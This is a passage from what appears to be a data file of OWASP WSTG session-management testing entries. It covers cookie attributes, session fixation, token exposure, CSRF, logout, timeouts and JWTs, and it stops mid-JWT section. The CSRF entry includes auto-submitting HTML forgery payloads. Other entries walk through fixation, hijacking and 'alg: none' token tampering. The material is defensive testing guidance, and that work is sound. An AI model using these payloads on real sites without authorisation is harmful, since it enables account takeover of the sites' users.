    The following areas should be addressed during the single and multiple Session ID structure testing:

    - What parts of the Session ID are static?
    - What clear-text confidential information is stored in the Session ID? E.g. usernames/UID, IP addresses
    - What easily decoded confidential information is stored?
    - What information can be deduced from the structure of the Session ID?
    - What portions of the Session ID are static for the same log in conditions?
    - What obvious patterns are present in the Session ID as a whole, or individual portions?

    #### Session ID Predictability and Randomness

    Analysis of the variable areas (if any) of the Session ID should be undertaken to establish the existence of any recognizable or predictable patterns. These analyses may be performed manually and with bespoke or OTS statistical or cryptanalytic tools to deduce any patterns in the Session ID content. Manual checks should include comparisons of Session IDs issued for the same login conditions – e.g., the same username, password, and IP address.

    Time is an important factor which must also be controlled. High numbers of simultaneous connections should be made in order to gather samples in the same time window and keep that variable constant. Even a quantization of 50ms or less may be too coarse and a sample taken in this way may reveal time-based components that would otherwise be missed.

    Variable elements should be analyzed over time to determine whether they are incremental in nature. Where they are incremental, patterns relating to absolute or elapsed time should be investigated. Many systems use time as a seed for their pseudo-random elements. Where the patterns are

    _(truncated — see the full WSTG test)_
- title: WSTG-SESS-02 Testing for Cookies Attributes
  service: http
  tech: session
  doc_kind: wstg
  content: |-
    ## WSTG-SESS-02 — Testing for Cookies Attributes

    Category: 06-Session_Management_Testing  
    Source: OWASP WSTG (WSTG-SESS-02) — CC BY-SA 4.0

    Web Cookies (herein referred to as cookies) are often a key attack vector for malicious users (typically targeting other users) and the application should always take due diligence to protect cookies.

    ### Test Objectives

    - Ensure that the proper security configuration is set for cookies.

    ### How to Test

    Below, a description of every attribute and prefix will be discussed. The tester should validate that they are being used properly by the application. Cookies can be reviewed by using an [intercepting proxy](#intercepting-proxy), or by reviewing the browser's cookie jar.

    ### Cookie Attributes

    #### Secure Attribute

    The [`Secure`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Secure) attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as `HTTPS`. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both `HTTP` and `HTTPS`, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.

    #### HttpOnly Attribute

    The [`HttpOnly`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#HttpOnly) attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.

    > This doesn't limit the whole attack surface of XSS attacks, as an attacker could still send request in place of the user, but limits immensely the reach of XSS attack vectors.

    #### Domain Attribute

    The [`Domain`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Scope_of_cookies) attribute is used to compare the cookie's domain against the domain of the server for which the HTTP request is being made. If the domain matches or if it is a subdomain, then the [`path`](#path-attribute) attribute will be checked next.

    Only hosts that belong to the specified domain can set a cookie for that domain. Additionally, the `domain` attribute cannot be a top level domain (such as `.gov` or `.com`) to prevent servers from setting arbitrary cookies for another domain (such as setting a cookie for `owasp.org`). If the domain attribute is not set, then the hostname of the server that generated the cookie is used as the default value of the `domain`.

    For example, if a cookie is set by an application at `app.mydomain.com` with no domain attribute set, then the cookie would be resubmitted for all subsequent requests for `app.mydomain.com`, but not its subdomains (such as `hacker.app.mydomain.com`), or to `otherapp.mydomain.com`. (However, older versions of Edge/IE behave differently, and _do_ send these cookies to subdomains.) If a developer wanted to loosen this restriction, then they could set the `domain` attribute to `mydomain.com`. In this case the cookie would be sent to all requests for `app.mydomain.com` and `mydomain.com` subdomains, such as `hacker.app.mydomain.com`, and even `bank.mydomain.com`. If there was a vulnerable server on a subdomain (for example, `otherapp.mydomain.com`) and the `domain` attribute has been set too loosely (for example, `mydomain.com`), then the vulnerable server could be used to harvest cookies (such as session tokens) across the full scope of `mydomain.com`.

    #### Path Attribute

    The [`Path`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Scope_of_cookies) attribute plays a major role in setting the scope of the cookies in conjunction with the [`domain`](#domain-attribute). In addition to the domain, the URL path that the cookie is valid for can be specified. If the domain and path match, then the cookie will be sent in the request. Just as with the domain attribute, if the path attribute is set too loosely, then it could leave the application vulnerable to attacks by other applications on the same server. For example, if the path attribute was set to the web server root `/`, then the application cookies will be sent to every application within the same domain (if multiple application reside under the same server). A couple of examples for multiple applications under the same server:

    - `path=/bank`
    - `path=/private`
    - `path=/docs`
    - `path=/docs/admin`

    #### Expires Attribute

    The [`Expires`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Permanent_cookies) attribute is used to:

    - set persistent cookies
    - limit lifespan if a session lives for too long
    - remove a cookie forcefully by setting it to a past date

    Unlike [session cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Session_cookies), persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.

    #### SameSite Attribute

    The [`SameSite`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies) attribute can be used to assert whether a cookie should be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-origin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent [cross-site request forgery](05-Testing_for_Cross_Site_Request_Forgery.md) attacks. This attribute can be configured in three different modes:

    - `Strict`
    - `Lax`
    - `None`

    ##### Strict Value

    The `Strict` value is the most restrictive usage of `SameSite`, allowing the browser to send the cookie only to first-party context without top-level navigation. In other words, the data associated with the cookie will only be sent on requests matching the current site shown on the browser URL bar. The cookie will not be sent on requests generated by third-party sites. This value is especially recommended for actions performed at the same domain. However, it can have some limitations with some session management systems negatively affecting the user navigation experience. Since the browser would not send the cookie on any requests generated from a third-party domain or email, the user would be required to sign in again even if they already have an authenticated session.

    ##### Lax Value

    The `Lax` value is less restrictive than `Strict`. It allows the cookie to be sent on cross-site _top-level navigations_ that use a "safe" HTTP method (in prac

    _(truncated — see the full WSTG test)_
- title: WSTG-SESS-03 Testing for Session Fixation
  service: http
  tech: session
  doc_kind: wstg
  content: |-
    ## WSTG-SESS-03 — Testing for Session Fixation

    Category: 06-Session_Management_Testing  
    Source: OWASP WSTG (WSTG-SESS-03) — CC BY-SA 4.0

    Session fixation is enabled by the insecure practice of preserving the same value of the session cookies before and after authentication. This typically happens when session cookies are used to store state information even before login, e.g., to add items to a shopping cart before authenticating for payment.

    ### Test Objectives

    - Analyze the authentication mechanism and its flow.
    - Force cookies and assess the impact.

    ### How to Test

    In this section we give an explanation of the testing strategy that will be shown in the next section.

    The first step is to make a request to the site to be tested (*e.g.* `www.example.com`). If the tester requests the following:

    ```http
    GET / HTTP/1.1
    Host: www.example.com
    ```

    They will obtain the following response:

    ```html
    HTTP/1.1 200 OK
    Date: Wed, 14 Aug 2008 08:45:11 GMT
    Server: IBM_HTTP_Server
    Set-Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1; Path=/; secure
    Cache-Control: no-cache="set-cookie,set-cookie2"
    Expires: Thu, 01 Dec 1994 16:00:00 GMT
    Keep-Alive: timeout=5, max=100
    Connection: Keep-Alive
    Content-Type: text/html;charset=Cp1254
    Content-Language: en-US
    ```

    The application sets a new session identifier, `JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1`, for the client.

    Next, if the tester successfully authenticates to the application with the following POST to `https://www.example.com/authentication.php`:

    ```http
    POST /authentication.php HTTP/1.1
    Host: www.example.com
    [...]
    Referer: https://www.example.com
    Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1
    Content-Type: application/x-www-form-urlencoded
    Content-length: 57

    Name=Meucci&wpPassword=secret!&wpLoginattempt=Log+in
    ```

    The tester observes the following response from the server:

    ```http
    HTTP/1.1 200 OK
    Date: Thu, 14 Aug 2008 14:52:58 GMT
    Server: Apache/2.2.2 (Fedora)
    X-Powered-By: PHP/5.1.6
    Content-language: en
    Cache-Control: private, must-revalidate, max-age=0
    X-Content-Encoding: gzip
    Content-length: 4090
    Connection: close
    Content-Type: text/html; charset=UTF-8
    ...
    HTML data
    ...
    ```

    As no new cookie has been issued upon a successful authentication, the tester knows that it is possible to perform session hijacking unless the integrity of the session cookie is ensured.

    The tester can send a valid session identifier to a user (possibly using a social engineering trick), wait for them to authenticate, and subsequently verify that privileges have been assigned to this cookie.

    ### Test with Forced Cookies

    This testing strategy is targeted at network attackers, hence it only needs to be applied to sites without full HSTS adoption (sites with full HSTS adoption are secure, since all their cookies have integrity). We assume to have two testing accounts on the site under test, one to act as the victim and one to act as the attacker. We simulate a scenario where the attacker forces in the victim's browser all the cookies which are not freshly issued after login and do not have integrity. After the victim's login, the attacker presents the forced cookies to the site to access the victim's account: if they are enough to act on the victim's behalf, session fixation is possible.

    Here are the steps for executing this test:

    1. Reach the login page of the site.
    2. Save a snapshot of the cookie jar before logging in, excluding cookies which contain the `__Host-` or `__Secure-` prefix in their name.
    3. Login to the site as the victim and reach any page offering a secure function requiring authentication.
    4. Set the cookie jar to the snapshot taken at step 2.
    5. Trigger the secure function identified at step 3.
    6. Observe whether the operation at step 5 has been performed successfully. If so, the attack was successful.
    7. Clear the cookie jar, login as the attacker and reach the page at step 3.
    8. Write in the cookie jar, one by one, the cookies saved at step 2.
    9. Trigger again the secure function identified at step 3.
    10. Clear the cookie jar and login again as the victim.
    11. Observe whether the operation at step 9 has been performed successfully in the victim's account. If so, the attack was successful; otherwise, the site is secure against session fixation.

    We recommend using two different machines or browsers for the victim and the attacker. This allows you to decrease the number of false positives if the web application does fingerprinting to verify access enabled from a given cookie. A shorter but less precise variant of the testing strategy only requires one testing account. It follows the same steps, but it halts at step 6.
- title: WSTG-SESS-04 Testing for Exposed Session Variables
  service: http
  tech: session
  doc_kind: wstg
  content: |-
    ## WSTG-SESS-04 — Testing for Exposed Session Variables

    Category: 06-Session_Management_Testing  
    Source: OWASP WSTG (WSTG-SESS-04) — CC BY-SA 4.0

    The Session Tokens (Cookie, SessionID, Hidden Field), if exposed, will usually enable an attacker to impersonate a victim and access the application illegitimately. It is important that they are protected from eavesdropping at all times, particularly whilst in transit between the client browser and the application servers.

    ### Test Objectives

    - Ensure that proper encryption is implemented.
    - Review the caching configuration.
    - Assess the channel and methods' security.

    ### How to Test

    ### Testing for Encryption & Reuse of Session Tokens Vulnerabilities

    Protection from eavesdropping is often provided by TLS encryption, but may incorporate other tunneling or encryption. It should be noted that encryption or cryptographic hashing of the Session ID should be considered separately from transport encryption, as it is the Session ID itself being protected, not the data that may be represented by it.

    If the Session ID could be presented by an attacker to the application to gain access, then it must be protected in transit to mitigate that risk. It should therefore be ensured that encryption is both the default and enforced for any request or response where the Session ID is passed, regardless of the mechanism used (e.g., a hidden form field). Simple checks such as replacing `https://` with `http://` during interaction with the application should be performed, together with modification of form posts to determine if adequate segregation between the secure and non-secure sites is implemented.

    Be mindful that if there is also an element to the site where the user is tracked with Session IDs but security is not present (e.g., noting which public documents a registered user downloads) it is essential that a different Session ID is used. The Session ID should therefore be monitored as the client switches from the secure to non-secure elements to ensure a different one is used.

    > Every time the authentication is successful, the user should expect to receive:
    >
    > - A different session token
    > - A token sent via encrypted channel every time they make an HTTP Request

    ### Testing for Proxies & Caching Vulnerabilities

    Proxies must also be considered when reviewing application security. In many cases, clients will access the application through corporate, ISP, or other proxies or protocol aware gateways (e.g., Firewalls). The HTTP protocol provides directives to control the behavior of downstream proxies, and the correct implementation of these directives should also be assessed.

    In general, the Session ID should never be sent over unencrypted transport and should never be cached. The application should be examined to ensure that encrypted communications are both the default and enforced for any transfer of Session IDs. Furthermore, whenever the Session ID is passed, directives should be in place to prevent its caching by intermediate and even local caches.

    The application should also be configured to secure data in caches over both HTTP/1.0 and HTTP/1.1 – RFC 2616 discusses the appropriate controls with reference to HTTP. HTTP/1.1 provides a number of cache control mechanisms. `Cache-Control: no-cache` indicates that a proxy must not re-use any data. Whilst `Cache-Control: Private` appears to be a suitable directive, this still allows a non-shared proxy to cache data. In the case of web-cafes or other shared systems, this presents a clear risk. Even with single-user workstations the cached Session ID may be exposed through a compromise of the file-system or where network stores are used. HTTP/1.0 caches do not recognise the `Cache-Control: no-cache` directive.

    > The `Expires: 0` and `Cache-Control: max-age=0` directives should be used to further ensure caches do not expose the data. Each request/response passing Session ID data should be examined to ensure appropriate cache directives are in use.

    ### Testing for GET & POST Vulnerabilities

    In general, GET requests should not be used, as the Session ID may be exposed in Proxy or Firewall logs. They are also far more easily manipulated than other types of transport, although it should be noted that almost any mechanism can be manipulated by the client with the right tools. Furthermore, [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) attacks are most easily exploited by sending a specially constructed link to the victim. This is far less likely if data is sent from the client as POSTs.

    All server-side code receiving data from POST requests should be tested to ensure it does not accept the data if sent as a GET. For example, consider the following POST request (`https://owaspapp.com/login.asp`) generated by a log in page.

    ```http
    POST /login.asp HTTP/1.1
    Host: owaspapp.com
    [...]
    Cookie: ASPSESSIONIDABCDEFG=ASKLJDLKJRELKHJG
    Content-Length: 51

    Login=Username&password=Password&SessionID=12345678
    ```

    If login.asp is badly implemented, it may be possible to log in using the following URL: `https://owaspapp.com/login.asp?Login=Username&password=Password&SessionID=12345678`

    Potentially insecure server-side scripts may be identified by checking each POST in this way.

    ### Testing for Transport Vulnerabilities

    All interaction between the Client and Application should be tested at least against the following criteria.

    - How are Session IDs transferred? e.g., GET, POST, Form Field (including hidden fields)
    - Are Session IDs always sent over encrypted transport by default?
    - Is it possible to manipulate the application to send Session IDs unencrypted? e.g., by changing HTTPS to HTTP?
    - What cache-control directives are applied to requests/responses passing Session IDs?
    - Are these directives always present? If not, where are the exceptions?
    - Are GET requests incorporating the Session ID used?
    - If POST is used, can it be interchanged with GET?
- title: WSTG-SESS-05 Testing for Cross Site Request Forgery
  service: http
  tech: session
  doc_kind: wstg
  content: |-
    ## WSTG-SESS-05 — Testing for Cross Site Request Forgery

    Category: 06-Session_Management_Testing  
    Source: OWASP WSTG (WSTG-SESS-05) — CC BY-SA 4.0

    Cross-Site Request Forgery ([CSRF](https://owasp.org/www-community/attacks/csrf)) is an attack that forces an end user to execute unintended actions on a web application in which they are currently authenticated. With a little social engineering help (like sending a link via email or chat), an attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation when it targets a normal user. If the targeted end user is the administrator account, a CSRF attack can compromise the entire web application.

    ### Test Objectives

    - Determine whether it is possible to initiate requests on a user's behalf that are not initiated by the user.

    ### How to Test

    ### SameSite Cookie Considerations

    Whether the PoCs above work depends on the session cookie's [`SameSite`](02-Testing_for_Cookies_Attributes.md#samesite-attribute) attribute and the browser's default. See that section for how `SameSite=Lax` treats top-level navigations versus subresource requests.

    In short: the `img`-tag PoC is a subresource request, and the auto-submitting form PoC uses `POST` - neither qualifies for the `Lax` top-level-navigation-with-a-safe-method exception, so in a browser that defaults to `Lax` (Chromium-based browsers, since early 2020), the session cookie won't be attached and the PoC as written won't fire. A form using `method="GET"` would still succeed under `Lax`, since that is a top-level `GET` navigation. Note also that [when `Lax` is applied as a default, Chromium-based browsers relax it further for the first two minutes after the cookie is set, still including it on `POST` requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value) - so a POST-based PoC fired immediately after authentication may still succeed.

    Don't conclude an application is safe from CSRF just because a PoC fails to fire in one browser - check the actual `Set-Cookie` header for the session cookie, and, if needed, retest in a browser that doesn't default to `Lax` (e.g. Firefox) to confirm whether the underlying vulnerability exists.

    ### Testing Session Management

    Audit the application to ascertain if its session management is vulnerable. If session management relies only on client-side values (information available to the browser), then the application is vulnerable. "Client-side values" refers to cookies and HTTP authentication credentials (Basic Authentication and other forms of HTTP authentication; not form-based authentication, which is an application-level authentication).

    Resources accessible via HTTP GET requests are easily vulnerable, though POST requests can be automated via JavaScript and are vulnerable as well; therefore, the use of POST alone is not enough to correct the occurrence of CSRF vulnerabilities.

    In case of POST, the following sample can be used.

    1. Create an HTML page similar to that shown below
    2. Host the HTML on a malicious or third-party site
    3. Send the link for the page to the victim(s) and induce them to click it.

    ```html
    <html>
    <body onload='document.CSRF.submit()'>

    <form action='https://targetWebsite/Authenticate.jsp' method='POST' name='CSRF'>
        <input type='hidden' name='name' value='Hacked'>
        <input type='hidden' name='password' value='Hacked'>
    </form>

    </body>
    </html>
    ```

    In case of web applications in which developers are utilizing JSON for browser to server communication, a problem may arise with the fact that there are no query parameters with the JSON format, which are a must with self-submitting forms. To bypass this case, we can use a self-submitting form with JSON payloads including hidden input to exploit CSRF. We'll have to change the encoding type (`enctype`) to `text/plain` to ensure the payload is delivered as-is. The exploit code will look like the following:

    ```html
    <html>
     <body>
      <script>history.pushState('', '', '/')</script>
       <form action='https://victimsite.com' method='POST' enctype='text/plain'>
         <input type='hidden' name='{"name":"hacked","password":"hacked","padding":"'value='something"}' />
         <input type='submit' value='Submit request' />
       </form>
     </body>
    </html>
    ```

    The POST request will be as follow:

    ```http
    POST / HTTP/1.1
    Host: victimsite.com
    Content-Type: text/plain

    {"name":"hacked","password":"hacked","padding":"=something"}
    ```

    When this data is sent as a POST request, the server will happily accept the name and password fields and ignore the one with the name padding as it does not need it.
- title: WSTG-SESS-06 Testing for Logout Functionality
  service: http
  tech: session
  doc_kind: wstg
  content: |-
    ## WSTG-SESS-06 — Testing for Logout Functionality

    Category: 06-Session_Management_Testing  
    Source: OWASP WSTG (WSTG-SESS-06) — CC BY-SA 4.0

    Session termination is an important part of the session lifecycle. Reducing to a minimum the lifetime of the session tokens decreases the likelihood of a successful session hijacking attack. This can be seen as a control against preventing other attacks like Cross Site Scripting and Cross Site Request Forgery. Such attacks have been known to rely on a user having an authenticated session present. Not having a secure session termination only increases the attack surface for any of these attacks.

    ### Test Objectives

    - Assess the logout UI.
    - Analyze the session timeout and if the session is properly killed after logout.

    ### How to Test

    ### Testing for Log Out User Interface

    Verify the appearance and visibility of the log out functionality in the user interface. For this purpose, view each page from the perspective of a user who has the intention to log out from the web application.

    > There are some properties which indicate a good log out user interface:
    >
    > - A log out button is present on all pages of the web application.
    > - The log out button should be identified quickly by a user who wants to log out from the web application.
    > - After loading a page the log out button should be visible without scrolling.
    > - Ideally the log out button is placed in an area of the page that is fixed in the view port of the browser and not affected by scrolling of the content.

    ### Testing for Server-Side Session Termination

    First, store the values of cookies that are used to identify a session. Invoke the log out function and observe the behavior of the application, especially regarding session cookies. Try to navigate to a page that is only visible in an authenticated session, e.g. by usage of the back button of the browser. If a cached version of the page is displayed, use the reload button to refresh the page from the server. If the log out function causes session cookies to be set to a new value, restore the old value of the session cookies and reload a page from the authenticated area of the application. If these test don't show any vulnerabilities on a particular page, try at least some further pages of the application that are considered as security-critical, to ensure that session termination is recognized properly by these areas of the application.

    > No data that should be visible only by authenticated users should be visible on the examined pages while performing the tests. Ideally the application redirects to a public area or a log in form while accessing authenticated areas after termination of the session. It should be not necessary for the security of the application, but setting session cookies to new values after log out is generally considered as good practice.

    ### Testing for Session Timeout

    Try to determine a session timeout by performing requests to a page in the authenticated area of the web application with increasing delays. If the log out behavior appears, the used delay matches approximately the session timeout value.

    > The same results as for server-side session termination testing described before are excepted by a log out caused by an inactivity timeout.
    >
    > The proper value for the session timeout depends on the purpose of the application and should be a balance of security and usability. In a banking applications it makes no sense to keep an inactive session more than 15 minutes. On the other side a short timeout in a wiki or forum could annoy users which are typing lengthy articles with unnecessary log in requests. There timeouts of an hour and more can be acceptable.

    ### Testing for Session Termination in Single Sign-On Environments (Single Sign-Off)

    Perform a log out in the tested application. Verify if there is a central portal or application directory which allows the user to log back in to the application without authentication. Test if the application requests the user to authenticate, if the URL of an entry point to the application is requested. While logged in in the tested application, perform a log out in the SSO system. Then try to access an authenticated area of the tested application.

    > It is expected that the invocation of a log out function in a web application connected to a SSO system or in the SSO system itself causes global termination of all sessions. An authentication of the user should be required to gain access to the application after log out in the SSO system and connected application.

    ### Testing Cross-Device Session Reuse and Single-Value Dependency in SSO

    > While traditional SSO logout testing focuses on reauthentication flows within the same browser context, testers must also evaluate whether authentication artifact (e.g., cookie, header, or bearer token) can be replayed across devices.

    In some Single Sign-On (SSO) implementations, authentication across multiple applications relies on a single authentication artifact issued after successful login (e.g., after password and MFA verification).

    > An example, while a cookie may be set with Secure and HttpOnly, its security depends entirely on server-side validation and revocation controls. If the SSO ecosystem relies on a single cookie as the sole proof of authentication, compromise of that cookie may grant immediate cross-application access.

    Testers should evaluate whether:

    - If only single authentication artifact is required to maintain authenticated state.
    - The authentication artifact can be reused across browsers or devices.
    - Logout properly invalidates the authentication artifact server-side.
    - All applications trusting the SSO authentication artifact reject it after logout.

    Test Procedure:

    - Step 1 – Authenticate and Capture All Issued Authentication Artifact

    1. Log in on Device 1 using valid credentials and complete MFA.
    2. Intercept the authentication response.
    3. Record all authentication artifact (e.g., cookie, header, or bearer token) issued by the application or SSO domain.

    For example: `auth-cookie=XYZ123`, `session_meta=ABC456`, `tracking_id=DEF789`...

    - Step 2 – Identify Authentication-Critical Artifact(s)

    The purpose of this step is to determine whether the SSO implementation depends on a single authentication artifact (e.g., cookie, header, or bearer token).

    1. Send requests to protected endpoints.
    2. Remove authentication artifact individually and resend the request.
    3. Observe which are required to maintain a 200 OK response.

    If only one authentication artifact (e.g., auth-cookie) is required to sustain authentication, this indicates that the SSO trust boundary may rely solely on that single-value.

    > Security Note:
    When a single authentication artifact represents the entire authenti

    _(truncated — see the full WSTG test)_
- title: WSTG-SESS-07 Testing Session Timeout
  service: http
  tech: session
  doc_kind: wstg
  content: |-
    ## WSTG-SESS-07 — Testing Session Timeout

    Category: 06-Session_Management_Testing  
    Source: OWASP WSTG (WSTG-SESS-07) — CC BY-SA 4.0

    In this phase testers check that the application automatically logs out a user when that user has been idle for a certain amount of time, ensuring that it is not possible to "reuse" the same session and that no sensitive data remains stored in the browser cache.

    ### Test Objectives

    - Validate that a hard session timeout exists.

    ### How to Test

    ### Black-Box Testing

    The same approach seen in the [Testing for logout functionality](06-Testing_for_Logout_Functionality.md) section can be applied when measuring the timeout log out.
    The testing methodology is very similar. First, testers have to check whether a timeout exists, for instance, by logging in and waiting for the timeout log out to be triggered. As in the log out function, after the timeout has passed, all session tokens should be destroyed or be unusable.

    Then, if the timeout is configured, testers need to understand whether the timeout is enforced by the client or by the server (or both). If the session cookie is non-persistent (or, more in general, the session cookie does not store any data about the time), testers can assume that the timeout is enforced by the server. If the session cookie contains some time related data (e.g., log in time, or last access time, or expiration date for a persistent cookie), then it's possible that the client is involved in the timeout enforcing. In this case, testers could try to modify the cookie (if it's not cryptographically protected) and see what happens to the session. For instance, testers can set the cookie expiration date far in the future and see whether the session can be prolonged.

    As a general rule, everything should be checked server-side and it should not be possible, by re-setting the session cookies to previous values, to access the application again.

    ### Gray-Box Testing

    The tester needs to check that:

    - The log out function effectively destroys all session token, or at least renders them unusable,
    - The server performs proper checks on the session state, disallowing an attacker to replay previously destroyed session identifiers
    - A timeout is enforced and it is properly enforced by the server. If the server uses an expiration time that is read from a session token that is sent by the client (but this is not advisable), then the token must be cryptographically protected from tampering.

    The most important thing is for the application to invalidate the session on the server-side. Generally this means that the code must invoke the appropriate methods, e.g. `HttpSession.invalidate()` in Java and `Session.abandon()` in .NET. Clearing the cookies from the browser is advisable, but is not strictly necessary, since if the session is properly invalidated on the server, having the cookie in the browser will not help an attacker.
- title: WSTG-SESS-08 Testing for Session Puzzling
  service: http
  tech: session
  doc_kind: wstg
  content: |-
    ## WSTG-SESS-08 — Testing for Session Puzzling

    Category: 06-Session_Management_Testing  
    Source: OWASP WSTG (WSTG-SESS-08) — CC BY-SA 4.0

    Session Variable Overloading (also known as Session Puzzling) is an application level vulnerability which can enable an attacker to perform a variety of malicious actions, including but not limited to:

    ### Test Objectives

    - Identify all session variables.
    - Break the logical flow of session generation.

    ### How to Test

    ### Black-Box Testing

    This vulnerability can be detected and exploited by enumerating all of the session variables used by the application and in which context they are valid. In particular this is possible by accessing a sequence of entry points and then examining exit points. In case of black-box testing this procedure is difficult and requires some luck since every different sequence could lead to a different result.

    #### Examples

    A very simple example could be the password reset functionality that, in the entry point, could request the user to provide some identifying information such as the username or the email address. This page might then populate the session with these identifying values, which are received directly from the client-side, or obtained from queries or calculations based on the received input. At this point there may be some pages in the application that show private data based on this session object. In this manner the attacker could bypass the authentication process.

    ### Gray-Box Testing

    The most effective way to detect these vulnerabilities is via a source code review.
- title: WSTG-SESS-09 Testing for Session Hijacking
  service: http
  tech: session
  doc_kind: wstg
  content: |-
    ## WSTG-SESS-09 — Testing for Session Hijacking

    Category: 06-Session_Management_Testing  
    Source: OWASP WSTG (WSTG-SESS-09) — CC BY-SA 4.0

    An attacker who gets access to user session cookies can impersonate them by presenting such cookies. This attack is known as session hijacking. When considering network attackers, i.e., attackers who control the network used by the victim, session cookies can be unduly exposed to the attacker over HTTP. To prevent this, session cookies should be marked with the `Secure` attribute so that they are only communicated over HTTPS.

    ### Test Objectives

    - Identify vulnerable session cookies.
    - Hijack vulnerable cookies and assess the risk level.

    ### How to Test

    The testing strategy is targeted at network attackers, hence it only needs to be applied to sites without full HSTS adoption (sites with full HSTS adoption are secure, since their cookies are not communicated over HTTP). We assume to have two testing accounts on the site under test, one to act as the victim and one to act as the attacker. We simulate a scenario where the attacker steals all the cookies which are not protected against disclosure over HTTP, and presents them to the site to access the victim's account. If these cookies are enough to act on the victim's behalf, session hijacking is possible.

    Here are the steps for executing this test:

    1. Login to the site as the victim and reach any page offering a secure function requiring authentication.
    2. Delete from the cookie jar all the cookies which satisfy any of the following conditions.
        - in case there is no HSTS adoption: the `Secure` attribute is set.
        - in case there is partial HSTS adoption: the `Secure` attribute is set or the `Domain` attribute is not set.
    3. Save a snapshot of the cookie jar.
    4. Trigger the secure function identified at step 1.
    5. Observe whether the operation at step 4 has been performed successfully. If so, the attack was successful.
    6. Clear the cookie jar, login as the attacker and reach the page at step 1.
    7. Write in the cookie jar, one by one, the cookies saved at step 3.
    8. Trigger again the secure function identified at step 1.
    9. Clear the cookie jar and login again as the victim.
    10. Observe whether the operation at step 8 has been performed successfully in the victim's account. If so, the attack was successful; otherwise, the site is secure against session hijacking.

    We recommend using two different machines or browsers for the victim and the attacker. This allows you to decrease the number of false positives if the web application does fingerprinting to verify access enabled from a given cookie. A shorter but less precise variant of the testing strategy only requires one testing account. It follows the same pattern, but it halts at step 5 (note that this makes step 3 useless).
- title: WSTG-SESS-10 Testing JSON Web Tokens
  service: http
  tech: session
  doc_kind: wstg
  content: |-
    ## WSTG-SESS-10 — Testing JSON Web Tokens

    Category: 06-Session_Management_Testing  
    Source: OWASP WSTG (WSTG-SESS-10) — CC BY-SA 4.0

    JSON Web Tokens (JWTs) are cryptographically signed JSON tokens, intended to share claims between systems. They are frequently used as authentication or session tokens, particularly on REST APIs.

    ### Test Objectives

    - Determine whether the JWTs expose sensitive information.
    - Determine whether the JWTs can be tampered with or modified.

    ### How to Test

    ### Overview

    JWTs are made up of three components:

    - The header
    - The payload (or body)
    - The signature

    Each component is base64 encoded, and they are separated by periods (`.`). Keep in mind the base64 encoding used in a JWT strips out the equals signs (`=`), so you may need to add these back in to decode the sections.

    ### Analyse the Contents

    #### Header

    The header defines the type of token (typically `JWT`), and the algorithm used for the signature. An example decoded header is shown below:

    ```json
    {
      "alg": "HS256",
      "typ": "JWT"
    }
    ```

    There are three main types of algorithms that are used to calculate the signatures:

    | Algorithm | Description |
    |-----------|-------------|
    | HSxxx | HMAC using a secret key and SHA-xxx. |
    | RSxxx and PSxxx | Public key signature using RSA. |
    | ESxxx | Public key signature using ECDSA. |

    There are also a wide range of [other algorithms](https://www.iana.org/assignments/jose/jose.xhtml#web-signature-encryption-algorithms) which may be used for encrypted tokens (JWEs), although these are less common.

    #### Payload

    The payload of the JWT contains the actual data. An example payload is shown below:

    ```json
    {
      "username": "administrator",
      "is_admin": true,
      "iat": 1516239022,
      "exp": 1516242622
    }
    ```

    The payload is it not usually encrypted, so review it to determine whether there is any sensitive of potentially inappropriate data included within it.

    This JWT includes the username and administrative status of the user, as well as two standard claims (`iat` and `exp`). These claims are defined in [RFC 7519](https://tools.ietf.org/html/rfc7519#section-4.1), a brief summary of them is given in the table below:

    | Claim | Full Name | Description |
    |-------|-----------|-------------|
    | `iss` | Issuer | The identity of the party who issued the token. |
    | `iat` | Issued At | The Unix timestamp of when the token was issued. |
    | `nbf` | Not Before | The Unix timestamp of earliest date that the token can be used. |
    | `exp` | Expires | The Unix timestamp of when the token expires. |

    #### Signature

    The signature is calculated using the algorithm defined in the JWT header, and then base64 encoded and appended to the token. Modifying any part of the JWT should cause the signature to be invalid, and the token to be rejected by the server.

    ### Review Usage

    As well as being cryptographically secure itself, the JWT also needs to be stored and sent in a secure manner. This should include checks that:

    - It is always [sent over encrypted (HTTPS) connections](../09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md).
    - If it is stored in a cookie, then it should be [marked with appropriate attributes](../06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md).

    The validity of the JWT should also be reviewed, based on the `iat`, `nbf` and `exp` claims, to determine that:

    - The JWT has a reasonable lifespan for the application.
    - Expired tokens are rejected by the application.

    ### Signature Verification

    One of the most serious vulnerabilities encountered with JWTs is when the application fails to validate that the signature is correct. This usually occurs when a developer uses a function such as the Node.js `jwt.decode()` function, which simply decodes the body of the JWT, rather than `jwt.verify()`, which verifies the signature before decoding the JWT.

    This can be easily tested for by modifying the body of the JWT without changing anything in the header or signature, submitting it in a request to see if the application accepts it.

    #### The None Algorithm

    As well as the public key and HMAC-based algorithms, the JWT specification also defines a signature algorithm called `none`. As the name suggests, this means that there is no signature for the JWT, allowing it to be modified.

    This can be tested by modifying the signature algorithm (`alg`) in the JWT header to `none`, as shown in the example below:

    ```json
    {
            "alg": "none",
            "typ": "JWT"
    }
    ```

